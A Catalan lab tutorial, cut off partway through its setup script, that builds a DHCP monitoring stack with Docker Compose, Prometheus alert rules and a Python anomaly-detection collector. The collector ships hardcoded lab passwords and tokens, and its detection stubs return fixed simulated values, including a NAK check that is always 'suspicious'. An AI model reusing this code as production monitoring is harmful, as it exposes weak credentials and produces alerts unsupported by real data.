# Activitat Guiada: Monitorització DHCP amb Grafana (Docker Compose v2)

## Objectius de l'Activitat

Al final d'aquesta activitat pràctica, haurieu de ser capaços de:
- Configurar monitorització DHCP en Windows Server i Linux
- Implementar col·lectores de mètriques DHCP personalitzats
- Crear dashboards visuals amb Grafana
- Configurar alertes per anomalies DHCP
- Detectar atacs comuns mitjançant monitorització
- Utilitzar Docker Compose v2 per orquestrar serveis
- Aquesta activitat té finalitats educatives. Mai s'ha d'utilitzar aquesta informació per un mal ús.

## Prerequisits

### Entorn de Laboratori
- **Docker Engine 20.10.0+** amb Docker Compose Plugin v2
- **Windows Server 2019/2022** amb rol DHCP instal·lat
- **Ubuntu 20.04/22.04** amb ISC DHCP Server
- **Python 3.8+** per als scripts col·lectors

### Verificació de Prerequisits
```bash
# Verificar Docker i Compose v2
docker --version
docker compose version  

# Si no tens Compose v2, instal·la'l:
# sudo apt-get update
# sudo apt-get install docker-compose-plugin
```

### Coneixements Previs
- Conceptes bàsics de DHCP
- Familiaritat amb PowerShell i Bash
- Nocions bàsiques de contenidors Docker

---

## Fase 1: Preparació de l'Entorn amb Docker Compose v2

### 1.1 Estructura del Projecte

```bash
# Crear estructura de directoris
mkdir dhcp-monitoring-lab
cd dhcp-monitoring-lab

# Estructura completa del projecte
mkdir -p {grafana/{dashboards,provisioning/{dashboards,datasources,alerting,notifiers}},prometheus/{rules,targets},scripts,data/{influxdb,grafana,prometheus}}

# Verificar estructura
tree .
```

### 1.2 Compose File Actualitzat (v2)

```yaml
# compose.yml (nou nom recomanat per Compose v2)
services:
  influxdb:
    image: influxdb:2.7-alpine
    container_name: dhcp-influxdb
    restart: unless-stopped
    ports:
      - "8086:8086"
    environment:
      - DOCKER_INFLUXDB_INIT_MODE=setup
      - DOCKER_INFLUXDB_INIT_USERNAME=admin
      - DOCKER_INFLUXDB_INIT_PASSWORD=DHCPLab2024!
      - DOCKER_INFLUXDB_INIT_ORG=dhcplab
      - DOCKER_INFLUXDB_INIT_BUCKET=dhcp_metrics
      - DOCKER_INFLUXDB_INIT_RETENTION=30d
      - DOCKER_INFLUXDB_INIT_ADMIN_TOKEN=dhcp-super-secret-auth-token-2024
    volumes:
      - ./data/influxdb:/var/lib/influxdb2
      - ./scripts/influxdb-init:/docker-entrypoint-initdb.d
    networks:
      - monitoring
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8086/ping"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s

  grafana:
    image: grafana/grafana:10.4.1
    container_name: dhcp-grafana
    restart: unless-stopped
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_USER=admin
      - GF_SECURITY_ADMIN_PASSWORD=DHCPAdmin2024!
      - GF_USERS_ALLOW_SIGN_UP=false
      - GF_INSTALL_PLUGINS=grafana-clock-panel,grafana-simple-json-datasource,grafana-worldmap-panel,grafana-piechart-panel
      - GF_SECURITY_ALLOW_EMBEDDING=true
      - GF_AUTH_ANONYMOUS_ENABLED=false
      - GF_ALERTING_ENABLED=true
      - GF_UNIFIED_ALERTING_ENABLED=true
      - GF_FEATURE_TOGGLES_ENABLE=ngalert
    volumes:
      - ./data/grafana:/var/lib/grafana
      - ./grafana/provisioning:/etc/grafana/provisioning
      - ./grafana/dashboards:/var/lib/grafana/dashboards
    networks:
      - monitoring
    depends_on:
      influxdb:
        condition: service_healthy
    healthcheck:
      test: ["CMD-SHELL", "curl -f http://localhost:3000/api/health || exit 1"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s

  prometheus:
    image: prom/prometheus:v2.51.0
    container_name: dhcp-prometheus
    restart: unless-stopped
    ports:
      - "9090:9090"
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.path=/prometheus'
      - '--storage.tsdb.retention.time=15d'
      - '--web.console.libraries=/etc/prometheus/console_libraries'
      - '--web.console.templates=/etc/prometheus/consoles'
      - '--web.enable-lifecycle'
      - '--web.enable-admin-api'
    volumes:
      - ./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml:ro
      - ./prometheus/rules:/etc/prometheus/rules:ro
      - ./data/prometheus:/prometheus
    networks:
      - monitoring
    healthcheck:
      test: ["CMD", "wget", "--no-verbose", "--tries=1", "--spider", "http://localhost:9090/-/healthy"]
      interval: 30s
      timeout: 10s
      retries: 3

  dhcp-exporter:
    image: alpine:3.19
    container_name: dhcp-exporter
    restart: unless-stopped
    command: tail -f /dev/null  # Mantenir el contenidor actiu
    volumes:
      - ./scripts:/scripts
      - /var/log:/host-logs:ro
    networks:
      - monitoring
    depends_on:
      - influxdb
    environment:
      - INFLUXDB_URL=http://influxdb:8086
      - INFLUXDB_TOKEN=dhcp-super-secret-auth-token-2024
      - INFLUXDB_ORG=dhcplab
      - INFLUXDB_BUCKET=dhcp_metrics

  alertmanager:
    image: prom/alertmanager:v0.27.0
    container_name: dhcp-alertmanager
    restart: unless-stopped
    ports:
      - "9093:9093"
    volumes:
      - ./prometheus/alertmanager.yml:/etc/alertmanager/alertmanager.yml:ro
    networks:
      - monitoring
    command:
      - '--config.file=/etc/alertmanager/alertmanager.yml'
      - '--storage.path=/alertmanager'

volumes:
  influxdb-data:
    name: dhcp_influxdb_data
  grafana-data:
    name: dhcp_grafana_data
  prometheus-data:
    name: dhcp_prometheus_data

networks:
  monitoring:
    name: dhcp_monitoring
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
          gateway: 172.20.0.1
```

### 1.3 Configuració de Prometheus

```yaml
# prometheus/prometheus.yml
global:
  scrape_interval: 15s
  evaluation_interval: 15s
  external_labels:
    cluster: 'dhcp-lab'
    environment: 'development'

rule_files:
  - "rules/*.yml"

alerting:
  alertmanagers:
    - static_configs:
        - targets:
          - alertmanager:9093

scrape_configs:
  - job_name: 'prometheus'
    static_configs:
      - targets: ['localhost:9090']
    scrape_interval: 30s

  - job_name: 'dhcp-metrics'
    static_configs:
      - targets: ['dhcp-exporter:8080']
    scrape_interval: 30s
    metrics_path: '/metrics'

  - job_name: 'influxdb'
    static_configs:
      - targets: ['influxdb:8086']
    scrape_interval: 60s
    metrics_path: '/metrics'

  - job_name: 'grafana'
    static_configs:
      - targets: ['grafana:3000']
    scrape_interval: 60s
    metrics_path: '/metrics'
```

### 1.4 Regles d'Alertes de Prometheus

```yaml
# prometheus/rules/dhcp_alerts.yml
groups:
  - name: dhcp_alerts
    rules:
    - alert: DHCPPoolHighUtilization
      expr: dhcp_pool_utilization > 85
      for: 2m
      labels:
        severity: warning
        service: dhcp
      annotations:
        summary: "DHCP Pool utilization is high"
        description: "DHCP Pool {{ $labels.pool_name }} utilization is {{ $value }}% which is above the threshold of 85%"

    - alert: DHCPPoolCriticalUtilization
      expr: dhcp_pool_utilization > 95
      for: 1m
      labels:
        severity: critical
        service: dhcp
      annotations:
        summary: "DHCP Pool utilization is critical"
        description: "DHCP Pool {{ $labels.pool_name }} utilization is {{ $value }}% which is critically high"

    - alert: DHCPHighNAKRate
      expr: rate(dhcp_nak_total[5m]) > 0.1
      for: 3m
      labels:
        severity: warning
        service: dhcp
      annotations:
        summary: "High DHCP NAK rate detected"
        description: "DHCP NAK rate is {{ $value }} per second over the last 5 minutes"

    - alert: DHCPPossibleStarvationAttack
      expr: rate(dhcp_discover_total[1m]) > 10
      for: 2m
      labels:
        severity: critical
        service: dhcp
        attack_type: starvation
      annotations:
        summary: "Possible DHCP starvation attack detected"
        description: "DHCP DISCOVER rate is {{ $value }} per second, which may indicate a starvation attack"

    - alert: DHCPServerDown
      expr: up{job="dhcp-metrics"} == 0
      for: 1m
      labels:
        severity: critical
        service: dhcp
      annotations:
        summary: "DHCP monitoring service is down"
        description: "DHCP metrics exporter has been down for more than 1 minute"
```

### 1.5 Configuració d'Alertmanager

```yaml
# prometheus/alertmanager.yml
global:
  smtp_smarthost: 'localhost:587'
  smtp_from: 'dhcp-alerts@company.com'

route:
  group_by: ['alertname', 'cluster', 'service']
  group_wait: 10s
  group_interval: 10s
  repeat_interval: 1h
  receiver: 'web.hook'
  routes:
  - match:
      severity: critical
    receiver: 'critical-alerts'
  - match:
      service: dhcp
    receiver: 'dhcp-team'

receivers:
- name: 'web.hook'
  webhook_configs:
  - url: 'http://127.0.0.1:5001/'

- name: 'critical-alerts'
  email_configs:
  - to: 'admin@company.com'
    subject: 'CRITICAL: {{ range .Alerts }}{{ .Annotations.summary }}{{ end }}'
    body: |
      {{ range .Alerts }}
      Alert: {{ .Annotations.summary }}
      Description: {{ .Annotations.description }}
      Labels: {{ range .Labels.SortedPairs }}{{ .Name }}={{ .Value }} {{ end }}
      {{ end }}

- name: 'dhcp-team'
  slack_configs:
  - api_url: 'https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK'
    channel: '#dhcp-alerts'
    title: 'DHCP Alert'
    text: '{{ range .Alerts }}{{ .Annotations.description }}{{ end }}'
```

---

## Fase 2: Scripts Col·lectors Millorats

### 2.1 Col·lector Linux Avançat

```python
#!/usr/bin/env python3
# scripts/dhcp_collector_linux_v2.py

import re
import time
import json
import asyncio
import aiohttp
import logging
from datetime import datetime, timedelta
from pathlib import Path
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional, Set
from influxdb_client.client.write_api import SYNCHRONOUS
from influxdb_client import InfluxDBClient, Point, WritePrecision

# Configuració de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/var/log/dhcp-collector.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class DHCPMetrics:
    timestamp: datetime
    discovers: int = 0
    offers: int = 0
    requests: int = 0
    acks: int = 0
    naks: int = 0
    releases: int = 0
    commits: int = 0
    expiries: int = 0
    declines: int = 0

@dataclass
class DHCPLease:
    ip_address: str
    mac_address: str
    hostname: str
    lease_start: datetime
    lease_end: datetime
    state: str
    scope: str

@dataclass
class DHCPAnomaly:
    timestamp: datetime
    anomaly_type: str
    severity: str
    description: str
    value: float
    metadata: Dict = None

class DHCPCollectorV2:
    def __init__(self, config_file: str = "/etc/dhcp-collector/config.json"):
        self.config = self._load_config(config_file)
        self.influx_client = self._init_influxdb()
        
        # Paths de fitxers
        self.dhcp_log = Path(self.config.get('dhcp_log_path', '/var/log/dhcp.log'))
        self.dhcp_leases = Path(self.config.get('dhcp_leases_path', '/var/lib/dhcp/dhcpd.leases'))
        
        # Control d'estat
        self.last_check = datetime.now() - timedelta(minutes=5)
        self.known_clients: Set[str] = set()
        self.baseline_metrics = self._calculate_baseline()
        
        # Cache per millorar rendiment
        self.metrics_cache = {}
        self.leases_cache = {}
        
    def _load_config(self, config_file: str) -> Dict:
        """Carrega configuració des d'un fitxer JSON"""
        default_config = {
            'influxdb': {
                'url': 'http://localhost:8086',
                'token': 'dhcp-super-secret-auth-token-2024',
                'org': 'dhcplab',
                'bucket': 'dhcp_metrics'
            },
            'dhcp_log_path': '/var/log/dhcp.log',
            'dhcp_leases_path': '/var/lib/dhcp/dhcpd.leases',
            'collection_interval': 60,
            'anomaly_detection': {
                'starvation_threshold': 50,
                'nak_threshold': 10,
                'pool_utilization_warning': 85,
                'pool_utilization_critical': 95
            }
        }
        
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                # Merge amb configuració per defecte
                return {**default_config, **config}
        except FileNotFoundError:
            logger.warning(f"Config file {config_file} not found, using defaults")
            return default_config
        except json.JSONDecodeError as e:
            logger.error(f"Error parsing config file: {e}")
            return default_config

    def _init_influxdb(self) -> InfluxDBClient:
        """Inicialitza client InfluxDB"""
        influx_config = self.config['influxdb']
        
        client = InfluxDBClient(
            url=influx_config['url'],
            token=influx_config['token'],
            org=influx_config['org'],
            timeout=30000
        )
        
        # Verificar connexió
        try:
            client.ping()
            logger.info("InfluxDB connection successful")
        except Exception as e:
            logger.error(f"InfluxDB connection failed: {e}")
            raise
        
        return client

    def _calculate_baseline(self) -> Dict:
        """Calcula mètriques baseline per detecció d'anomalies"""
        # Aquí podríem implementar càlcul de baseline des de dades històriques
        return {
            'avg_discovers_per_minute': 5,
            'avg_offers_per_minute': 4,
            'avg_requests_per_minute': 4,
            'max_normal_nak_rate': 2
        }

    async def parse_dhcp_logs_async(self) -> DHCPMetrics:
        """Analitza logs DHCP de manera asíncrona"""
        metrics = DHCPMetrics(timestamp=datetime.utcnow())
        
        if not self.dhcp_log.exists():
            logger.warning(f"DHCP log file {self.dhcp_log} not found")
            return metrics
        
        try:
            # Llegir només les línies noves des de l'última verificació
            async with aiohttp.ClientSession() as session:
                with open(self.dhcp_log, 'r') as f:
                    for line in f:
                        if not self._is_recent_log(line):
                            continue
                        
                        # Parsing més robust amb regex
                        log_patterns = {
                            'discovers': r'DHCPDISCOVER from ([a-f0-9:]{17})',
                            'offers': r'DHCPOFFER on (\d+\.\d+\.\d+\.\d+) to ([a-f0-9:]{17})',
                            'requests': r'DHCPREQUEST for (\d+\.\d+\.\d+\.\d+).*from ([a-f0-9:]{17})',
                            'acks': r'DHCPACK on (\d+\.\d+\.\d+\.\d+) to ([a-f0-9:]{17})',
                            'naks': r'DHCPNAK on (\d+\.\d+\.\d+\.\d+) to ([a-f0-9:]{17})',
                            'releases': r'DHCP_RELEASE.*(\d+\.\d+\.\d+\.\d+).*([a-f0-9:]{17})',
                            'commits': r'DHCP_COMMIT.*(\d+\.\d+\.\d+\.\d+).*([a-f0-9:]{17})',
                            'expiries': r'DHCP_EXPIRY.*(\d+\.\d+\.\d+\.\d+)',
                            'declines': r'DHCPDECLINE of (\d+\.\d+\.\d+\.\d+) from ([a-f0-9:]{17})'
                        }
                        
                        for event_type, pattern in log_patterns.items():
                            if re.search(pattern, line):
                                current_value = getattr(metrics, event_type)
                                setattr(metrics, event_type, current_value + 1)
                                
                                # Tracking de clients únics
                                mac_match = re.search(r'([a-f0-9:]{17})', line)
                                if mac_match:
                                    self.known_clients.add(mac_match.group(1))
        
        except Exception as e:
            logger.error(f"Error parsing DHCP logs: {e}")
        
        return metrics

    async def get_lease_statistics_async(self) -> Dict:
        """Obté estadístiques de leases de manera asíncrona"""
        stats = {
            'active_leases': 0,
            'expired_leases': 0,
            'reserved_leases': 0,
            'abandoned_leases': 0,
            'pool_utilization': 0.0,
            'unique_clients': 0,
            'lease_duration_avg': 0,
            'lease_remaining_avg': 0,
            'scopes': {}
        }
        
        if not self.dhcp_leases.exists():
            logger.warning(f"DHCP leases file {self.dhcp_leases} not found")
            return stats
        
        try:
            with open(self.dhcp_leases, 'r') as f:
                content = f.read()
            
            # Parsing més sofisticat del fitxer de leases
            lease_pattern = r'lease\s+(\d+\.\d+\.\d+\.\d+)\s+{([^}]+)}'
            leases = re.findall(lease_pattern, content, re.DOTALL)
            
            now = datetime.now()
            lease_durations = []
            remaining_times = []
            active_clients = set()
            
            for ip, lease_content in leases:
                lease_info = self._parse_lease_content(lease_content)
                
                if lease_info.get('ends') and lease_info.get('state'):
                    try:
                        end_time = datetime.strptime(lease_info['ends'], '%Y/%m/%d %H:%M:%S')
                        state = lease_info['state'].strip()
                        
                        # Determinar subnet/scope
                        scope = self._determine_scope(ip)
                        if scope not in stats['scopes']:
                            stats['scopes'][scope] = {'active': 0, 'total': 0, 'utilization': 0}
                        
                        stats['scopes'][scope]['total'] += 1
                        
                        if state == 'active' and end_time > now:
                            stats['active_leases'] += 1
                            stats['scopes'][scope]['active'] += 1
                            
                            duration = (end_time - now).total_seconds()
                            lease_durations.append(duration)
                            remaining_times.append(duration)
                            
                            if lease_info.get('client_hostname'):
                                active_clients.add(lease_info['client_hostname'])
                        
                        elif state == 'expired' or end_time <= now:
                            stats['expired_leases'] += 1
                        elif state == 'reserved':
                            stats['reserved_leases'] += 1
                        elif state == 'abandoned':
                            stats['abandoned_leases'] += 1
                            
                    except (ValueError, KeyError) as e:
                        logger.debug(f"Error parsing lease for {ip}: {e}")
                        continue
            
            # Calcular estadístiques derivades
            if lease_durations:
                stats['lease_duration_avg'] = sum(lease_durations) / len(lease_durations)
            
            if remaining_times:
                stats['lease_remaining_avg'] = sum(remaining_times) / len(remaining_times)
            
            stats['unique_clients'] = len(active_clients)
            
            # Calcular utilització per scope
            total_pool_size = self._get_total_pool_size()
            if total_pool_size > 0:
                stats['pool_utilization'] = (stats['active_leases'] / total_pool_size) * 100
            
            for scope, scope_stats in stats['scopes'].items():
                scope_pool_size = self._get_scope_pool_size(scope)
                if scope_pool_size > 0:
                    scope_stats['utilization'] = (scope_stats['active'] / scope_pool_size) * 100
        
        except Exception as e:
            logger.error(f"Error getting lease statistics: {e}")
        
        return stats

    def _parse_lease_content(self, content: str) -> Dict:
        """Parse el contingut d'un lease individual"""
        lease_info = {}
        
        patterns = {
            'ends': r'ends\s+\d+\s+([^;]+);',
            'state': r'binding state\s+([^;]+);',
            'client_hostname': r'client-hostname\s+"([^"]+)";',
            'hardware': r'hardware ethernet\s+([^;]+);',
            'uid': r'uid\s+"([^"]+)";',
            'starts': r'starts\s+\d+\s+([^;]+);'
        }
        
        for key, pattern in patterns.items():
            match = re.search(pattern, content)
            if match:
                lease_info[key] = match.group(1).strip()
        
        return lease_info

    def _determine_scope(self, ip: str) -> str:
        """Determina el scope/subnet d'una IP"""
        import ipaddress
        
        try:
            ip_addr = ipaddress.ip_address(ip)
            
            # Definir scopes coneguts (hauria de venir de configuració)
            known_scopes = {
                '192.168.100.0/24': 'main_office',
                '192.168.101.0/24': 'guest_network',
                '10.0.0.0/24': 'server_network'
            }
            
            for network, scope_name in known_scopes.items():
                if ip_addr in ipaddress.ip_network(network):
                    return scope_name
            
            return f"unknown_{ip.split('.')[0]}.{ip.split('.')[1]}.{ip.split('.')[2]}.0"
        
        except ValueError:
            return "invalid_ip"

    def _get_total_pool_size(self) -> int:
        """Obté la mida total del pool DHCP"""
        # Aquesta informació hauria de venir de la configuració del servidor DHCP
        # Per ara, fem una estimació
        return 200

    def _get_scope_pool_size(self, scope: str) -> int:
        """Obté la mida del pool per un scope específic"""
        scope_sizes = {
            'main_office': 90,
            'guest_network': 50,
            'server_network': 60,
            'default': 50
        }
        return scope_sizes.get(scope, scope_sizes['default'])

    async def detect_anomalies_advanced(self, metrics: DHCPMetrics, stats: Dict) -> List[DHCPAnomaly]:
        """Detecció avançada d'anomalies amb ML bàsic"""
        anomalies = []
        threshold_config = self.config['anomaly_detection']
        
        # Detecció de DHCP Starvation amb anàlisi temporal
        if metrics.discovers > threshold_config['starvation_threshold']:
            # Verificar si és un patró sostingut
            recent_discovers = await self._get_recent_metric_trend('discovers', minutes=5)
            if len(recent_discovers) >= 3 and all(x > 20 for x in recent_discovers):
                anomalies.append(DHCPAnomaly(
                    timestamp=metrics.timestamp,
                    anomaly_type='dhcp_starvation',
                    severity='critical',
                    description=f"Sustained DHCP starvation pattern detected. Current rate: {metrics.discovers}/min, recent trend: {recent_discovers}",
                    value=float(metrics.discovers),
                    metadata={
                        'trend': recent_discovers,
                        'baseline': self.baseline_metrics.get('avg_discovers_per_minute', 5),
                        'confidence': self._calculate_confidence_score(metrics.discovers, recent_discovers)
                    }
                ))

        # Detecció de Rogue DHCP Server
        if metrics.offers > 0 and metrics.discovers > 0:
            offer_ratio = metrics.offers / metrics.discovers
            if offer_ratio > 1.2:  # Més ofertes que discovers (possible rogue server)
                anomalies.append(DHCPAnomaly(
                    timestamp=metrics.timestamp,
                    anomaly_type='rogue_dhcp_server',
                    severity='high',
                    description=f"Possible rogue DHCP server detected. Offer/Discover ratio: {offer_ratio:.2f}",
                    value=offer_ratio,
                    metadata={
                        'discovers': metrics.discovers,
                        'offers': metrics.offers,
                        'expected_ratio': 0.8
                    }
                ))

        # Detecció d'exhaustió de pool amb predicció
        for scope, scope_stats in stats['scopes'].items():
            utilization = scope_stats['utilization']
            
            if utilization > threshold_config['pool_utilization_critical']:
                # Calcular temps estimat fins a l'exhaustió total
                growth_rate = await self._calculate_utilization_growth_rate(scope)
                estimated_exhaustion = self._predict_pool_exhaustion(utilization, growth_rate)
                
                anomalies.append(DHCPAnomaly(
                    timestamp=metrics.timestamp,
                    anomaly_type='pool_critical_utilization',
                    severity='critical',
                    description=f"Critical pool utilization in {scope}: {utilization:.1f}%. Estimated exhaustion: {estimated_exhaustion}",
                    value=utilization,
                    metadata={
                        'scope': scope,
                        'growth_rate': growth_rate,
                        'estimated_exhaustion': estimated_exhaustion,
                        'active_leases': scope_stats['active'],
                        'total_capacity': scope_stats['total']
                    }
                ))
            elif utilization > threshold_config['pool_utilization_warning']:
                anomalies.append(DHCPAnomaly(
                    timestamp=metrics.timestamp,
                    anomaly_type='pool_high_utilization',
                    severity='warning',
                    description=f"High pool utilization in {scope}: {utilization:.1f}%",
                    value=utilization,
                    metadata={'scope': scope, 'active_leases': scope_stats['active']}
                ))

        # Detecció d'atacs DoS basats en patrons de NAK
        if metrics.naks > threshold_config['nak_threshold']:
            nak_pattern = await self._analyze_nak_pattern()
            if nak_pattern['is_suspicious']:
                anomalies.append(DHCPAnomaly(
                    timestamp=metrics.timestamp,
                    anomaly_type='nak_dos_attack',
                    severity='high',
                    description=f"Suspicious NAK pattern detected: {metrics.naks} NAKs/min. {nak_pattern['description']}",
                    value=float(metrics.naks),
                    metadata=nak_pattern
                ))

        # Detecció de clients anòmals (masses sol·licituds)
        client_anomalies = await self._detect_client_anomalies()
        anomalies.extend(client_anomalies)

        return anomalies

    async def _get_recent_metric_trend(self, metric_name: str, minutes: int = 5) -> List[float]:
        """Obté la tendència recent d'una mètrica específica"""
        # Simulació - en un entorn real, consultaria InfluxDB
        # query = f'SELECT {metric_name} FROM dhcp_events WHERE time > now() - {minutes}m'
        return [25, 30, 45, 52, 48]  # Exemple de trend

    def _calculate_confidence_score(self, current_value: float, trend: List[float]) -> float:
        """Calcula un score de confiança per a l'anomalia"""
        if not trend:
            return 0.5
        
        avg_trend = sum(trend) / len(trend)
        variance = sum((x - avg_trend) ** 2 for x in trend) / len(trend)
        
        # Score basat en desviació de la mitjana i consistència
        deviation_score = min(abs(current_value - avg_trend) / avg_trend, 1.0) if avg_trend > 0 else 0
        consistency_score = 1.0 / (1.0 + variance / avg_trend) if avg_trend > 0 else 0
        
        return (deviation_score + consistency_score) / 2

    async def _calculate_utilization_growth_rate(self, scope: str) -> float:
        """Calcula la taxa de creixement de la utilització d'un scope"""
        # En un entorn real, consultaria dades històriques
        return 2.5  # % per hora (exemple)

    def _predict_pool_exhaustion(self, current_utilization: float, growth_rate: float) -> str:
        """Prediu quan s'exhaurirà completament el pool"""
        if growth_rate <= 0:
            return "N/A"
        
        remaining_capacity = 100 - current_utilization
        hours_to_exhaustion = remaining_capacity / growth_rate
        
        if hours_to_exhaustion < 1:
            return f"{int(hours_to_exhaustion * 60)} minutes"
        elif hours_to_exhaustion < 24:
            return f"{hours_to_exhaustion:.1f} hours"
        else:
            return f"{hours_to_exhaustion / 24:.1f} days"

    async def _analyze_nak_pattern(self) -> Dict:
        """Analitza patrons de NAK per detectar possibles atacs"""
        # Simulació d'anàlisi de patrons
        return {
            'is_suspicious': True,
            'description': 'Multiple NAKs from same client',
            'pattern_type': 'repeated_request',
            'confidence': 0.85
        }

    async def _detect_client_anomalies(self) -> List[DHCPAnomaly]:
        """Detecta clients amb comportament anòmal"""
        anomalies = []
        
        # Anàlisi de clients amb masses sol·licituds
        suspicious_clients = await self._identify_suspicious_clients()
        
        for client_data in suspicious_clients:
            anomalies.append(DHCPAnomaly(
                timestamp=datetime.utcnow(),
                anomaly_type='suspicious_client',
                severity='medium',
                description=f"Client {client_data['mac']} has unusual request pattern: {client_data['requests']}/min",
                value=float(client_data['requests']),
                metadata=client_data
            ))
        
        return anomalies

    async def _identify_suspicious_clients(self) -> List[Dict]:
        """Identifica clients amb patrons sospitosos"""
        # En un entorn real, analitzaria logs per identificar patrons
        return [
            {'mac': '00:11:22:33:44:55', 'requests': 25, 'type': 'excessive_requests'},
            {'mac': '00:aa:bb:cc:dd:ee', 'requests': 15, 'type': 'rapid_cycling'}
        ]

    async def send_metrics_to_influx_async(self, metrics: DHCPMetrics, stats: Dict, anomalies: List[DHCPAnomaly]):
        """Envia mètriques a InfluxDB de manera asíncrona"""
        write_api = self.influx_client.write_api(write_options=SYNCHRONOUS)
        points = []
        
        # Convertir mètriques DHCP
        for field_name, value in asdict(metrics).items():
            if field_name != 'timestamp' and isinstance(value, (int, float)):
                point = Point("dhcp_events") \
                    .tag("server", "linux-dhcp") \
                    .tag("metric_type", field_name) \
                    .field("count", value) \
                    .time(metrics.timestamp, WritePrecision.S)
                points.append(point)

        # Estadístiques de leases
        for stat_name, value in stats.items():
            if stat_name != 'scopes' and isinstance(value, (int, float)):
                point = Point("dhcp_leases") \
                    .tag("server", "linux-dhcp") \
                    .tag("stat_type", stat_name) \
                    .field("value", float(value)) \
                    .time(metrics.timestamp, WritePrecision.S)
                points.append(point)

        # Estadístiques per scope
        for scope_name, scope_data in stats.get('scopes', {}).items():
            for metric_name, metric_value in scope_data.items():
                if isinstance(metric_value, (int, float)):
                    point = Point("dhcp_scopes") \
                        .tag("server", "linux-dhcp") \
                        .tag("scope", scope_name) \
                        .tag("metric", metric_name) \
                        .field("value", float(metric_value)) \
                        .time(metrics.timestamp, WritePrecision.S)
                    points.append(point)

        # Anomalies
        for anomaly in anomalies:
            point = Point("dhcp_anomalies") \
                .tag("server", "linux-dhcp") \
                .tag("anomaly_type", anomaly.anomaly_type) \
                .tag("severity", anomaly.severity) \
                .field("value", anomaly.value) \
                .field("description", anomaly.description) \
                .time(anomaly.timestamp, WritePrecision.S)
            
            # Afegir metadata com a tags/fields
            if anomaly.metadata:
                for key, value in anomaly.metadata.items():
                    if isinstance(value, str):
                        point = point.tag(f"meta_{key}", value)
                    elif isinstance(value, (int, float)):
                        point = point.field(f"meta_{key}", float(value))
            
            points.append(point)

        # Escriure tots els punts
        try:
            write_api.write(
                bucket=self.config['influxdb']['bucket'], 
                org=self.config['influxdb']['org'], 
                record=points
            )
            logger.info(f"Successfully sent {len(points)} metrics to InfluxDB")
        except Exception as e:
            logger.error(f"Error sending metrics to InfluxDB: {e}")

    def _is_recent_log(self, log_line: str) -> bool:
        """Verifica si el log és recent"""
        try:
            timestamp_match = re.match(r'(\w+\s+\d+\s+\d+:\d+:\d+)', log_line)
            if timestamp_match:
                log_time_str = f"{datetime.now().year} {timestamp_match.group(1)}"
                log_time = datetime.strptime(log_time_str, '%Y %b %d %H:%M:%S')
                return log_time > self.last_check
        except Exception:
            pass
        return True

    async def run_collection_async(self):
        """Executa el bucle de col·lecció de manera asíncrona"""
        logger.info("Starting advanced DHCP metrics collection...")
        
        while True:
            try:
                collection_start = datetime.now()
                
                # Col·lecció paral·lela de mètriques
                metrics_task = self.parse_dhcp_logs_async()
                stats_task = self.get_lease_statistics_async()
                
                metrics, stats = await asyncio.gather(metrics_task, stats_task)
                
                # Detecció d'anomalies
                anomalies = await self.detect_anomalies_advanced(metrics, stats)
                
                # Enviar a InfluxDB
                await self.send_metrics_to_influx_async(metrics, stats, anomalies)
                
                # Logging i debug
                collection_time = (datetime.now() - collection_start).total_seconds()
                logger.info(f"Collection completed in {collection_time:.2f}s")
                logger.info(f"Metrics: {asdict(metrics)}")
                logger.info(f"Active leases: {stats['active_leases']}, Pool utilization: {stats['pool_utilization']:.1f}%")
                
                if anomalies:
                    logger.warning(f"Anomalies detected: {len(anomalies)}")
                    for anomaly in anomalies:
                        logger.warning(f"  - {anomaly.anomaly_type}: {anomaly.description}")

                # Actualitzar timestamp
                self.last_check = datetime.now()
                
                # Esperar interval configurat
                await asyncio.sleep(self.config['collection_interval'])
                
            except KeyboardInterrupt:
                logger.info("Collection stopped by user")
                break
            except Exception as e:
                logger.error(f"Error in collection cycle: {e}")
                await asyncio.sleep(60)

if __name__ == "__main__":
    collector = DHCPCollectorV2()
    asyncio.run(collector.run_collection_async())
```

---

## Fase 3: Desplegament amb Docker Compose v2

### 3.1 Script d'Inicialització Automatitzada

```bash
#!/bin/bash
# scripts/setup_dhcp_monitoring_v2.sh

set -e  # Exit on error

echo "🚀 Setting up DHCP Monitoring Lab with Docker Compose v2..."

# Colors per output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Funcions d'utilitat
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Verificar prerequisits
check_prerequisites() {
    log_info "Checking prerequisites..."
    
    # Verificar Docker
    if ! command -v docker &> /dev/null; then
        log_error "Docker is required but not installed. Please install Docker first."
        exit 1
    fi
    
    # Verificar Docker Compose v2
    if ! docker compose version &> /dev/null; then
        log_error "Docker Compose v2 is required. Please install docker-compose-plugin."
        log_info "Install with: sudo apt-get install docker-compose-plugin"
        exit 1
    fi
    
    # Verificar permisos Docker
    if ! docker ps &> /dev/null; then
        log_error "Cannot run Docker commands. Please add your user to the docker group:"
        log_info "sudo usermod -aG docker \$USER && newgrp docker"
        exit 1
    fi
    
    # Verificar ports disponibles
    local ports=(3000 8086 9090 9093)
    for port in "${ports[@]}"; do
        if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null; then
            log_warning "Port $port is already in use. Please stop the service using it."
        fi
    done
    
    log_success "Prerequisites check passed!"
}

# Crear estructura de directoris
setup_directories() {
    log_info "Creating directory structure..."
    
    PROJECT_DIR="dhcp-monitoring-lab-v2"
    mkdir -p "$PROJECT_DIR"
    cd "$PROJECT_DIR"
    
    # Estructura completa
